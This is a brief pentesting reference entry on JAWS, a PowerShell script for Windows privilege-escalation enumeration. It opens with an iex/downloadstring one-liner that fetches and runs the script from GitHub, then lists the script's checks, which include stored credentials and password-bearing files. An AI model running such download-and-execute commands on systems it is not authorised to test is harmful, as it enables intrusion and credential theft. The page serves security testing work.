# JAWS



## Start

```text
iex(New-Object net.WebClient).downloadstring("https://raw.githubusercontent.com/411Hall/JAWS
/master/jaws-enum.ps1")
```

## Info recopilation

It does not only check for privilege escalation missconfiguration, but it also gathers information about the current situation.

* [x] Users & groups
* [x] Network \(interfaces, arp, ports, firewall \(lot of output\), **hosts**\)
* [x] Processes
* [x] Scheduled Tasks \(lot of output\)
* [x] Services \(lot of output\)
* [x] Installed Software, Program folders
* [x] Patches
* [x] Drives
* [x] Last modified files

## Checks

* [x] Files and folders with Full Control
* [x] Unquoted Service Paths
* [x] Potentially interesting files
* [x] System files with password
* [x] Stored credentials

